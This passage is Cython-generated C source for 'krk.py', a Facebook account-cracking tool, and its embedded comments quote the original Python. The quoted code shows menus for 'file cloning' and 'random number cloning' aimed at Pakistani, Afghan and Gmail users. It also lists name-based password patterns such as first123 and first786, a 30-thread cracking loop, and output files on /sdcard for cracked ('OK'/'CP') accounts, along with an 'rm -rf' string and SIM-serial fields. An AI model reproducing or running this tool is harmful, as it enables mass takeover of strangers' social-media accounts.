    {&__pyx_n_s_random, __pyx_k_random, sizeof(__pyx_k_random), 0, 0, 1, 1},
    {&__pyx_n_s_random_seed, __pyx_k_random_seed, sizeof(__pyx_k_random_seed), 0, 0, 1, 1},
    {&__pyx_n_s_randrange, __pyx_k_randrange, sizeof(__pyx_k_randrange), 0, 0, 1, 1},
    {&__pyx_n_s_range, __pyx_k_range, sizeof(__pyx_k_range), 0, 0, 1, 1},
    {&__pyx_n_s_re, __pyx_k_re, sizeof(__pyx_k_re), 0, 0, 1, 1},
    {&__pyx_kp_s_re_txt, __pyx_k_re_txt, sizeof(__pyx_k_re_txt), 0, 0, 1, 0},
    {&__pyx_n_s_read, __pyx_k_read, sizeof(__pyx_k_read), 0, 0, 1, 1},
    {&__pyx_n_s_replace, __pyx_k_replace, sizeof(__pyx_k_replace), 0, 0, 1, 1},
    {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
    {&__pyx_kp_s_rm_rf_re_txt, __pyx_k_rm_rf_re_txt, sizeof(__pyx_k_rm_rf_re_txt), 0, 0, 1, 0},
    {&__pyx_n_s_rndm, __pyx_k_rndm, sizeof(__pyx_k_rndm), 0, 0, 1, 1},
    {&__pyx_n_s_rndm_locals_genexpr, __pyx_k_rndm_locals_genexpr, sizeof(__pyx_k_rndm_locals_genexpr), 0, 0, 1, 1},
    {&__pyx_n_s_rsplit, __pyx_k_rsplit, sizeof(__pyx_k_rsplit), 0, 0, 1, 1},
    {&__pyx_kp_s_s_are_on, __pyx_k_s_are_on, sizeof(__pyx_k_s_are_on), 0, 0, 1, 0},
    {&__pyx_n_s_samsung, __pyx_k_samsung, sizeof(__pyx_k_samsung), 0, 0, 1, 1},
    {&__pyx_kp_s_sdcard_ZEA_CP_txt, __pyx_k_sdcard_ZEA_CP_txt, sizeof(__pyx_k_sdcard_ZEA_CP_txt), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_ZEA_OK_txt, __pyx_k_sdcard_ZEA_OK_txt, sizeof(__pyx_k_sdcard_ZEA_OK_txt), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_ZEA_R_CP_txt, __pyx_k_sdcard_ZEA_R_CP_txt, sizeof(__pyx_k_sdcard_ZEA_R_CP_txt), 0, 0, 1, 0},
    {&__pyx_kp_s_sdcard_ZEA_R_OK_txt, __pyx_k_sdcard_ZEA_R_OK_txt, sizeof(__pyx_k_sdcard_ZEA_R_OK_txt), 0, 0, 1, 0},
    {&__pyx_n_s_search, __pyx_k_search, sizeof(__pyx_k_search), 0, 0, 1, 1},
    {&__pyx_kp_s_sec_ch_prefers_color_scheme, __pyx_k_sec_ch_prefers_color_scheme, sizeof(__pyx_k_sec_ch_prefers_color_scheme), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_ch_ua, __pyx_k_sec_ch_ua, sizeof(__pyx_k_sec_ch_ua), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_ch_ua_mobile, __pyx_k_sec_ch_ua_mobile, sizeof(__pyx_k_sec_ch_ua_mobile), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_ch_ua_platform, __pyx_k_sec_ch_ua_platform, sizeof(__pyx_k_sec_ch_ua_platform), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_fetch_dest, __pyx_k_sec_fetch_dest, sizeof(__pyx_k_sec_fetch_dest), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_fetch_mode, __pyx_k_sec_fetch_mode, sizeof(__pyx_k_sec_fetch_mode), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_fetch_site, __pyx_k_sec_fetch_site, sizeof(__pyx_k_sec_fetch_site), 0, 0, 1, 0},
    {&__pyx_kp_s_sec_fetch_user, __pyx_k_sec_fetch_user, sizeof(__pyx_k_sec_fetch_user), 0, 0, 1, 0},
    {&__pyx_n_s_secure, __pyx_k_secure, sizeof(__pyx_k_secure), 0, 0, 1, 1},
    {&__pyx_n_s_send, __pyx_k_send, sizeof(__pyx_k_send), 0, 0, 1, 1},
    {&__pyx_n_s_session, __pyx_k_session, sizeof(__pyx_k_session), 0, 0, 1, 1},
    {&__pyx_n_s_session_key, __pyx_k_session_key, sizeof(__pyx_k_session_key), 0, 0, 1, 1},
    {&__pyx_kp_s_shortly_with, __pyx_k_shortly_with, sizeof(__pyx_k_shortly_with), 0, 0, 1, 0},
    {&__pyx_n_s_sim_id, __pyx_k_sim_id, sizeof(__pyx_k_sim_id), 0, 0, 1, 1},
    {&__pyx_n_s_sim_serials, __pyx_k_sim_serials, sizeof(__pyx_k_sim_serials), 0, 0, 1, 1},
    {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
    {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
    {&__pyx_n_s_spec, __pyx_k_spec, sizeof(__pyx_k_spec), 0, 0, 1, 1},
    {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
    {&__pyx_n_s_splitlines, __pyx_k_splitlines, sizeof(__pyx_k_splitlines), 0, 0, 1, 1},
    {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},
    {&__pyx_n_s_stdout, __pyx_k_stdout, sizeof(__pyx_k_stdout), 0, 0, 1, 1},
    {&__pyx_n_s_string, __pyx_k_string, sizeof(__pyx_k_string), 0, 0, 1, 1},
    {&__pyx_n_s_submit, __pyx_k_submit, sizeof(__pyx_k_submit), 0, 0, 1, 1},
    {&__pyx_n_s_subprocess, __pyx_k_subprocess, sizeof(__pyx_k_subprocess), 0, 0, 1, 1},
    {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
    {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
    {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
    {&__pyx_n_s_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 0, 1, 1},
    {&__pyx_kp_s_text_html_application_xhtml_xml, __pyx_k_text_html_application_xhtml_xml, sizeof(__pyx_k_text_html_application_xhtml_xml), 0, 0, 1, 0},
    {&__pyx_n_s_throw, __pyx_k_throw, sizeof(__pyx_k_throw), 0, 0, 1, 1},
    {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
    {&__pyx_n_s_tks, __pyx_k_tks, sizeof(__pyx_k_tks), 0, 0, 1, 1},
    {&__pyx_n_s_tl, __pyx_k_tl, sizeof(__pyx_k_tl), 0, 0, 1, 1},
    {&__pyx_n_s_tokenku, __pyx_k_tokenku, sizeof(__pyx_k_tokenku), 0, 0, 1, 1},
    {&__pyx_n_s_total, __pyx_k_total, sizeof(__pyx_k_total), 0, 0, 1, 1},
    {&__pyx_n_s_total_ids, __pyx_k_total_ids, sizeof(__pyx_k_total_ids), 0, 0, 1, 1},
    {&__pyx_n_s_tred, __pyx_k_tred, sizeof(__pyx_k_tred), 0, 0, 1, 1},
    {&__pyx_n_s_true, __pyx_k_true, sizeof(__pyx_k_true), 0, 0, 1, 1},
    {&__pyx_n_s_try_num, __pyx_k_try_num, sizeof(__pyx_k_try_num), 0, 0, 1, 1},
    {&__pyx_n_s_twf, __pyx_k_twf, sizeof(__pyx_k_twf), 0, 0, 1, 1},
    {&__pyx_n_s_ua, __pyx_k_ua, sizeof(__pyx_k_ua), 0, 0, 1, 1},
    {&__pyx_n_s_uaku2, __pyx_k_uaku2, sizeof(__pyx_k_uaku2), 0, 0, 1, 1},
    {&__pyx_n_s_ugen, __pyx_k_ugen, sizeof(__pyx_k_ugen), 0, 0, 1, 1},
    {&__pyx_n_s_uid, __pyx_k_uid, sizeof(__pyx_k_uid), 0, 0, 1, 1},
    {&__pyx_n_s_unknown, __pyx_k_unknown, sizeof(__pyx_k_unknown), 0, 0, 1, 1},
    {&__pyx_kp_s_upgrade_insecure_requests, __pyx_k_upgrade_insecure_requests, sizeof(__pyx_k_upgrade_insecure_requests), 0, 0, 1, 0},
    {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
    {&__pyx_n_s_url_wa, __pyx_k_url_wa, sizeof(__pyx_k_url_wa), 0, 0, 1, 1},
    {&__pyx_n_s_urllib, __pyx_k_urllib, sizeof(__pyx_k_urllib), 0, 0, 1, 1},
    {&__pyx_n_s_user, __pyx_k_user, sizeof(__pyx_k_user), 0, 0, 1, 1},
    {&__pyx_kp_s_user_agent, __pyx_k_user_agent, sizeof(__pyx_k_user_agent), 0, 0, 1, 0},
    {&__pyx_n_s_uuid, __pyx_k_uuid, sizeof(__pyx_k_uuid), 0, 0, 1, 1},
    {&__pyx_n_s_uuid4, __pyx_k_uuid4, sizeof(__pyx_k_uuid4), 0, 0, 1, 1},
    {&__pyx_kp_s_viewport_width, __pyx_k_viewport_width, sizeof(__pyx_k_viewport_width), 0, 0, 1, 0},
    {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
    {&__pyx_kp_s_www_facebook_com, __pyx_k_www_facebook_com, sizeof(__pyx_k_www_facebook_com), 0, 0, 1, 0},
    {&__pyx_n_s_wx, __pyx_k_wx, sizeof(__pyx_k_wx), 0, 0, 1, 1},
    {&__pyx_n_s_x, __pyx_k_x, sizeof(__pyx_k_x), 0, 0, 1, 1},
    {&__pyx_n_s_xd, __pyx_k_xd, sizeof(__pyx_k_xd), 0, 0, 1, 1},
    {&__pyx_kp_u_xdg_open_https_chat_whatsapp_com, __pyx_k_xdg_open_https_chat_whatsapp_com, sizeof(__pyx_k_xdg_open_https_chat_whatsapp_com), 0, 1, 0, 0},
    {&__pyx_kp_s_xdg_open_https_chat_whatsapp_com_2, __pyx_k_xdg_open_https_chat_whatsapp_com_2, sizeof(__pyx_k_xdg_open_https_chat_whatsapp_com_2), 0, 0, 1, 0},
    {&__pyx_kp_s_xdg_open_https_facebook_com_grou, __pyx_k_xdg_open_https_facebook_com_grou, sizeof(__pyx_k_xdg_open_https_facebook_com_grou), 0, 0, 1, 0},
    {&__pyx_kp_s_xdg_open_https_www_facebook_com, __pyx_k_xdg_open_https_www_facebook_com, sizeof(__pyx_k_xdg_open_https_www_facebook_com), 0, 0, 1, 0},
    {&__pyx_n_s_y, __pyx_k_y, sizeof(__pyx_k_y), 0, 0, 1, 1},
    {&__pyx_n_s_yes, __pyx_k_yes, sizeof(__pyx_k_yes), 0, 0, 1, 1},
    {&__pyx_n_s_zea, __pyx_k_zea, sizeof(__pyx_k_zea), 0, 0, 1, 1},
    {&__pyx_n_s_zlib, __pyx_k_zlib, sizeof(__pyx_k_zlib), 0, 0, 1, 1},
    {0, 0, 0, 0, 0, 0, 0}
  };
  return __Pyx_InitStrings(__pyx_string_tab);
}
/* #### Code section: cached_builtins ### */
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 20, __pyx_L1_error)
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 679, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 83, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 90, __pyx_L1_error)
  __pyx_builtin_ValueError = __Pyx_GetBuiltinName(__pyx_n_s_ValueError); if (!__pyx_builtin_ValueError) __PYX_ERR(0, 224, __pyx_L1_error)
  __pyx_builtin_IndexError = __Pyx_GetBuiltinName(__pyx_n_s_IndexError); if (!__pyx_builtin_IndexError) __PYX_ERR(0, 331, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}
/* #### Code section: cached_constants ### */

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  /* "krk.py":64
 * +==================================================+""")
 * def linex():
 *         print('\033[1;37m----------------------------------------------')             # <<<<<<<<<<<<<<
 * def clear():
 *         os.system('clear')
 */
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_s_1_37m); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 64, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  /* "krk.py":81
 *                 x = ("zea")
 *                 if x == ("zea"):
 *                         print(' [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu')             # <<<<<<<<<<<<<<
 *                         linex()
 *                         xd=input(' Choose an option: ')
 */
  __pyx_tuple__2 = PyTuple_Pack(1, __pyx_kp_s_1_File_cloning_2_Random_number); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 81, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__2);
  __Pyx_GIVEREF(__pyx_tuple__2);

  /* "krk.py":83
 *                         print(' [1] File cloning\n [2] Random number cloning\n [3] WhatsApp Group (join)\n [0] Exit menu')
 *                         linex()
 *                         xd=input(' Choose an option: ')             # <<<<<<<<<<<<<<
 *                         if xd in ['1','01']:
 *                                 clear()
 */
  __pyx_tuple__3 = PyTuple_Pack(1, __pyx_kp_s_Choose_an_option); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);

  /* "krk.py":86
 *                         if xd in ['1','01']:
 *                                 clear()
 *                                 print(' Put file example:  /sdcard/File.txt ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 file = input(' Put file path\033[1;37m: ')
 */
  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_kp_s_Put_file_example_sdcard_File_tx); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__4);
  __Pyx_GIVEREF(__pyx_tuple__4);

  /* "krk.py":88
 *                                 print(' Put file example:  /sdcard/File.txt ')
 *                                 linex()
 *                                 file = input(' Put file path\033[1;37m: ')             # <<<<<<<<<<<<<<
 *                                 try:
 *                                         fo = open(file,'r').read().splitlines()
 */
  __pyx_tuple__5 = PyTuple_Pack(1, __pyx_kp_s_Put_file_path_1_37m); if (unlikely(!__pyx_tuple__5)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__5);
  __Pyx_GIVEREF(__pyx_tuple__5);

  /* "krk.py":92
 *                                         fo = open(file,'r').read().splitlines()
 *                                 except FileNotFoundError:
 *                                         print(' File location not found ')             # <<<<<<<<<<<<<<
 *                                         time.sleep(1)
 *                                         menu()
 */
  __pyx_tuple__6 = PyTuple_Pack(1, __pyx_kp_s_File_location_not_found); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 92, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__6);
  __Pyx_GIVEREF(__pyx_tuple__6);

  /* "krk.py":96
 *                                         menu()
 *                                 clear()
 *                                 print(' Try method 2 & 3 for best results  ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 print(' [1] Method \n [2] Method \n [3] Method ')
 */
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_s_Try_method_2_3_for_best_results); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 96, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);

  /* "krk.py":98
 *                                 print(' Try method 2 & 3 for best results  ')
 *                                 linex()
 *                                 print(' [1] Method \n [2] Method \n [3] Method ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 mthd=input(' Choose: ')
 */
  __pyx_tuple__8 = PyTuple_Pack(1, __pyx_kp_s_1_Method_2_Method_3_Method); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 98, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__8);
  __Pyx_GIVEREF(__pyx_tuple__8);

  /* "krk.py":100
 *                                 print(' [1] Method \n [2] Method \n [3] Method ')
 *                                 linex()
 *                                 mthd=input(' Choose: ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 plist = []
 */
  __pyx_tuple__9 = PyTuple_Pack(1, __pyx_kp_s_Choose); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 100, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__9);
  __Pyx_GIVEREF(__pyx_tuple__9);

  /* "krk.py":103
 *                                 linex()
 *                                 plist = []
 *                                 print(' Select Password Crack menu');linex();print(' [1] Crack with auto password \n [2] Crack with choice password');linex()             # <<<<<<<<<<<<<<
 *                                 ppp=input(' Choose: ')
 *                                 if ppp in ['1','01']:
 */
  __pyx_tuple__10 = PyTuple_Pack(1, __pyx_kp_s_Select_Password_Crack_menu); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);
  __pyx_tuple__11 = PyTuple_Pack(1, __pyx_kp_s_1_Crack_with_auto_password_2_Cr); if (unlikely(!__pyx_tuple__11)) __PYX_ERR(0, 103, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__11);
  __Pyx_GIVEREF(__pyx_tuple__11);

  /* "krk.py":116
 *                                 elif ppp in ['3','03']:
 *                                         clear()
 *                                         print(' \033[1;32mWorking password for Pakistan\033[1;37m ')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
 */
  __pyx_tuple__12 = PyTuple_Pack(1, __pyx_kp_s_1_32mWorking_password_for_Pakis); if (unlikely(!__pyx_tuple__12)) __PYX_ERR(0, 116, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__12);
  __Pyx_GIVEREF(__pyx_tuple__12);

  /* "krk.py":118
 *                                         print(' \033[1;32mWorking password for Pakistan\033[1;37m ')
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print('\033[1;32m Out of Pakistan working password\033[1;37m ')
 */
  __pyx_tuple__13 = PyTuple_Pack(1, __pyx_kp_s_1_first_last_2_firstlast_3_firs); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 118, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__13);
  __Pyx_GIVEREF(__pyx_tuple__13);

  /* "krk.py":120
 *                                         print(' [1] first last\n [2] firstlast\n [3] first123\n [4] first1234\n [5] first786\n [6] first110\n [7] firstlast123\n [8] firstlast786\n [9] firstlast110')
 *                                         linex()
 *                                         print('\033[1;32m Out of Pakistan working password\033[1;37m ')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
 */
  __pyx_tuple__14 = PyTuple_Pack(1, __pyx_kp_s_1_32m_Out_of_Pakistan_working_p); if (unlikely(!__pyx_tuple__14)) __PYX_ERR(0, 120, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__14);
  __Pyx_GIVEREF(__pyx_tuple__14);

  /* "krk.py":122
 *                                         print('\033[1;32m Out of Pakistan working password\033[1;37m ')
 *                                         linex()
 *                                         print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
 */
  __pyx_tuple__15 = PyTuple_Pack(1, __pyx_kp_s_1_first_last_2_firstlast_3_firs_2); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 122, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

  /* "krk.py":124
 *                                         print(' [1] first last\n [2] firstlast\n [3] first1234\n [4] First Last\n [5] first123 ')
 *                                         linex()
 *                                         print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         input(' Press enter to back menu ')
 */
  __pyx_tuple__16 = PyTuple_Pack(1, __pyx_kp_s_1_32mfor_new_ids_use_just_1_pas); if (unlikely(!__pyx_tuple__16)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__16);
  __Pyx_GIVEREF(__pyx_tuple__16);

  /* "krk.py":126
 *                                         print(' \033[1;32mfor new ids use just 1 password \033[1;37m \n [1] first last > best results \n \033[1;32melse\033[1;37m \n [1] first last\n [2] firstlast\n [3] First Last\n [4] First Last')
 *                                         linex()
 *                                         input(' Press enter to back menu ')             # <<<<<<<<<<<<<<
 *                                         menu()
 *                                 else:
 */
  __pyx_tuple__17 = PyTuple_Pack(1, __pyx_kp_s_Press_enter_to_back_menu); if (unlikely(!__pyx_tuple__17)) __PYX_ERR(0, 126, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__17);
  __Pyx_GIVEREF(__pyx_tuple__17);

  /* "krk.py":131
 *                                         try:
 *                                                 linex()
 *                                                 ps_limit = int(input(' How many passwords do you want to add ? '))             # <<<<<<<<<<<<<<
 *                                         except:
 *                                                 ps_limit =1
 */
  __pyx_tuple__18 = PyTuple_Pack(1, __pyx_kp_s_How_many_passwords_do_you_want); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 131, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__18);
  __Pyx_GIVEREF(__pyx_tuple__18);

  /* "krk.py":135
 *                                                 ps_limit =1
 *                                         linex()
 *                                         print('\033[1;32m exp: first123 last123 firstlast ')             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         for i in range(ps_limit):
 */
  __pyx_tuple__19 = PyTuple_Pack(1, __pyx_kp_s_1_32m_exp_first123_last123_firs); if (unlikely(!__pyx_tuple__19)) __PYX_ERR(0, 135, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__19);
  __Pyx_GIVEREF(__pyx_tuple__19);

  /* "krk.py":140
 *                                                 plist.append(input(f' Put password {i+1}: '))
 *                                 linex()
 *                                 print(' Do you went show cp account? (y/n): ')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 cx=input(' Choose: ')
 */
  __pyx_tuple__21 = PyTuple_Pack(1, __pyx_kp_s_Do_you_went_show_cp_account_y_n); if (unlikely(!__pyx_tuple__21)) __PYX_ERR(0, 140, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__21);
  __Pyx_GIVEREF(__pyx_tuple__21);

  /* "krk.py":151
 *                                         total_ids = str(len(fo))
 *                                         print(' Total account ids : \033[1;32m'+total_ids+f' ')
 *                                         print("\x1b[1;95m Use flight mode for speed up\033[1;37m")             # <<<<<<<<<<<<<<
 *                                         print("\x1b[1;93m Please Wait Cloning started...")
 *                                         linex()
 */
  __pyx_tuple__23 = PyTuple_Pack(1, __pyx_kp_s_1_95m_Use_flight_mode_for_speed); if (unlikely(!__pyx_tuple__23)) __PYX_ERR(0, 151, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__23);
  __Pyx_GIVEREF(__pyx_tuple__23);

  /* "krk.py":152
 *                                         print(' Total account ids : \033[1;32m'+total_ids+f' ')
 *                                         print("\x1b[1;95m Use flight mode for speed up\033[1;37m")
 *                                         print("\x1b[1;93m Please Wait Cloning started...")             # <<<<<<<<<<<<<<
 *                                         linex()
 *                                         for user in fo:
 */
  __pyx_tuple__24 = PyTuple_Pack(1, __pyx_kp_s_1_93m_Please_Wait_Cloning_start); if (unlikely(!__pyx_tuple__24)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__24);
  __Pyx_GIVEREF(__pyx_tuple__24);

  /* "krk.py":147
 *                                 else:
 *                                         pcp.append('n')
 *                                 with tred(max_workers=30) as crack_submit:             # <<<<<<<<<<<<<<
 *                                         clear()
 *                                         total_ids = str(len(fo))
 */
  __pyx_tuple__26 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 147, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);

  /* "krk.py":163
 *                                                 else:
 *                                                         crack_submit.submit(api1,ids,names,passlist)
 *                                 print('\033[1;37m')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 print(' The process has completed')
 */
  __pyx_tuple__27 = PyTuple_Pack(1, __pyx_kp_s_1_37m_2); if (unlikely(!__pyx_tuple__27)) __PYX_ERR(0, 163, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__27);
  __Pyx_GIVEREF(__pyx_tuple__27);

  /* "krk.py":165
 *                                 print('\033[1;37m')
 *                                 linex()
 *                                 print(' The process has completed')             # <<<<<<<<<<<<<<
 *                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                                 linex()
 */
  __pyx_tuple__28 = PyTuple_Pack(1, __pyx_kp_s_The_process_has_completed); if (unlikely(!__pyx_tuple__28)) __PYX_ERR(0, 165, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__28);
  __Pyx_GIVEREF(__pyx_tuple__28);

  /* "krk.py":168
 *                                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                                 linex()
 *                                 input(' Press enter to back ')             # <<<<<<<<<<<<<<
 *                                 os.system('python ZEA.py')
 *                         elif xd in ['4','04']:
 */
  __pyx_tuple__30 = PyTuple_Pack(1, __pyx_kp_s_Press_enter_to_back); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 168, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
  __Pyx_GIVEREF(__pyx_tuple__30);

  /* "krk.py":177
 *                         elif xd in ['2','02']:
 *                                 clear()
 *                                 print(' [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu')             # <<<<<<<<<<<<<<
 *                                 linex()
 *                                 x=input(' Choose: ')
 */
  __pyx_tuple__32 = PyTuple_Pack(1, __pyx_kp_s_1_Afghanistan_cloning_2_Pakista); if (unlikely(!__pyx_tuple__32)) __PYX_ERR(0, 177, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__32);
  __Pyx_GIVEREF(__pyx_tuple__32);

  /* "krk.py":198
 *                                 os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
 *                         elif xd in ['0','00']:
 *                                 exit(' Thanks for use  ')             # <<<<<<<<<<<<<<
 *                         else:
 *                                 exit(' Option not found in menu...')
 */
  __pyx_tuple__33 = PyTuple_Pack(1, __pyx_kp_s_Thanks_for_use); if (unlikely(!__pyx_tuple__33)) __PYX_ERR(0, 198, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__33);
  __Pyx_GIVEREF(__pyx_tuple__33);

  /* "krk.py":200
 *                                 exit(' Thanks for use  ')
 *                         else:
 *                                 exit(' Option not found in menu...')             # <<<<<<<<<<<<<<
 *                 else:
 *                         print(' \033[1;31mTrail Time Has Been Ended ....')
 */
  __pyx_tuple__34 = PyTuple_Pack(1, __pyx_kp_s_Option_not_found_in_menu); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 200, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__34);
  __Pyx_GIVEREF(__pyx_tuple__34);

  /* "krk.py":202
 *                                 exit(' Option not found in menu...')
 *                 else:
 *                         print(' \033[1;31mTrail Time Has Been Ended ....')             # <<<<<<<<<<<<<<
 *                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
 *                         clear()
 */
  __pyx_tuple__35 = PyTuple_Pack(1, __pyx_kp_s_1_31mTrail_Time_Has_Been_Ended); if (unlikely(!__pyx_tuple__35)) __PYX_ERR(0, 202, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__35);
  __Pyx_GIVEREF(__pyx_tuple__35);

  /* "krk.py":203
 *                 else:
 *                         print(' \033[1;31mTrail Time Has Been Ended ....')
 *                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)             # <<<<<<<<<<<<<<
 *                         clear()
 *                         print('\033[1;31m First Read Note : ')
 */
  __pyx_tuple__36 = PyTuple_Pack(1, __pyx_kp_s_1_31m_Your_Not_Premium_User_1_3); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 203, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__36);
  __Pyx_GIVEREF(__pyx_tuple__36);

  /* "krk.py":205
